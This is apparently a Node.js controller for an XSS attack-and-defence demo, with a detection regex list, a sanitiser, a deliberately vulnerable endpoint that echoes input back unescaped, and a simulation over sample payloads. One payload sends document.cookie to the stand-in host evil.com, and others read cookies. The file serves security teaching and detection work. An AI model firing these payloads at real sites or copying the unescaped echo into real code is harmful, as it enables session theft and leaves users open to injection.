const ActivityLog = require('../models/ActivityLog');
const SecurityEvent = require('../models/SecurityEvent');
const { calculateRiskScore } = require('../services/riskScorer');

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function detectXSS(input) {
    const value = String(input ?? '');
    const patterns = [
        /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
        /javascript\s*:/gi,
        /on\w+\s*=\s*["'][^"']*["']/gi,
        /<iframe[\s\S]*?>/gi,
        /eval\s*\(/gi,
        /document\.(cookie|location|write)/gi,
        /<img[^>]+src[^>]*onerror/gi,
    ];

    return patterns.some((pattern) => pattern.test(value));
}

function sanitizeInput(input) {
    return String(input ?? '')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;')
        .replace(/javascript:/gi, '')
        .replace(/on\w+=/gi, '');
}

async function logXSSAttempt({ req, input, type, safe, blocked, sanitized }) {
    const riskReasons = ['XSS payload detected', `Type: ${type || 'reflected'}`];
    const payload = String(input ?? '');
    const socket = req.app.get('io');

    await ActivityLog.create({
        eventType: 'ATTACK_SIM_XSS',
        ipAddress: req.ip,
        severity: 'critical',
        riskScore: 85,
        riskReasons,
        metadata: {
            payload,
            type,
            sanitized,
            blocked,
            safe,
        },
    });

    await SecurityEvent.create({
        type: 'XSS_ATTEMPT',
        ipAddress: req.ip,
        description: `XSS payload injected: ${payload.substring(0, 60)}`,
        severity: 'critical',
        riskScore: 85,
    });

    socket?.emit('security_alert', {
        type: blocked ? 'XSS_BLOCKED' : 'XSS_DETECTED',
        severity: 'critical',
        riskScore: 85,
        description: `XSS ${blocked ? 'blocked' : 'detected'}: ${type || 'reflected'} injection`,
        timestamp: new Date(),
    });
}

async function vulnerable(req, res) {
    try {
        const { input, type } = req.body;
        const payload = String(input ?? '');
        const detected = detectXSS(payload);

        if (detected) {
            await logXSSAttempt({
                req,
                input: payload,
                type,
                safe: false,
                blocked: false,
                sanitized: false,
            });

            return res.status(200).json({
                safe: false,
                rendered: payload,
                warning: 'This endpoint is intentionally vulnerable for demo purposes',
                detected: true,
                payload,
            });
        }

        return res.status(200).json({
            safe: true,
            rendered: payload,
            detected: false,
            payload,
        });
    } catch (error) {
        console.error('XSS vulnerable endpoint error:', error);
        return res.status(500).json({ error: 'Failed to process vulnerable XSS demo' });
    }
}

async function protectedHandler(req, res) {
    try {
        const { input, type } = req.body;
        const payload = String(input ?? '');
        const xssDetected = detectXSS(payload);
        const sanitized = sanitizeInput(payload);

        if (xssDetected) {
            await logXSSAttempt({
                req,
                input: payload,
                type,
                safe: true,
                blocked: true,
                sanitized: true,
            });

            return res.status(200).json({
                safe: true,
                rendered: sanitized,
                original: payload,
                blocked: true,
                sanitizationApplied: true,
                cspHeader: "default-src 'self'; script-src 'self'; object-src 'none'",
            });
        }

        return res.status(200).json({
            safe: true,
            rendered: sanitized,
            blocked: false,
        });
    } catch (error) {
        console.error('XSS protected endpoint error:', error);
        return res.status(500).json({ error: 'Failed to process protected XSS demo' });
    }
}

async function simulate(req, res) {
    try {
        const socket = req.app.get('io');
        const payloads = [
            { payload: "<script>alert('XSS')</script>", type: 'stored' },
            { payload: '<img src=x onerror=alert(document.cookie)>', type: 'reflected' },
            { payload: 'javascript:void(document.cookie)', type: 'dom' },
            { payload: "<iframe src='javascript:alert(1)'></iframe>", type: 'stored' },
            { payload: "<svg onload=fetch('http://evil.com?c='+document.cookie)>", type: 'dom' },
        ];

        const results = [];

        for (const item of payloads) {
            const detected = detectXSS(item.payload);

            await ActivityLog.create({
                eventType: 'ATTACK_SIM_XSS',
                ipAddress: req.ip,
                severity: detected ? 'critical' : 'info',
                riskScore: detected ? 85 : 0,
                riskReasons: detected ? ['XSS payload detected', `Type: ${item.type}`] : ['No XSS detected'],
                metadata: {
                    payload: item.payload,
                    type: item.type,
                    sanitized: false,
                    blocked: false,
                    detected,
                },
            });

            socket?.emit('activity_log', {
                eventType: 'ATTACK_SIM_XSS',
                ipAddress: req.ip,
                severity: detected ? 'critical' : 'info',
                riskScore: detected ? 85 : 0,
                metadata: {
                    payload: item.payload,
                    type: item.type,
                    detected,
                },
                timestamp: new Date(),
            });

            results.push({ ...item, detected });
            if (item !== payloads[payloads.length - 1]) {
                await delay(500);
            }
        }

        const risk = await calculateRiskScore(req.ip);

        socket?.emit('security_alert', {
            type: 'XSS_ATTACK_COMPLETE',
            ipAddress: req.ip,
            severity: risk.level,
            riskScore: risk.score,
            description: `XSS attack simulation completed with risk score ${risk.score}`,
            timestamp: new Date(),
        });

        return res.status(200).json({
            payloadsTested: payloads.length,
            allDetected: results.every((result) => result.detected),
            riskScore: risk.score,
            level: risk.level,
        });
    } catch (error) {
        console.error('XSS simulation error:', error);
        return res.status(500).json({ error: 'Failed to run XSS simulation' });
    }
}

module.exports = {
    vulnerable,
    protected: protectedHandler,
    simulate,
    detectXSS,
};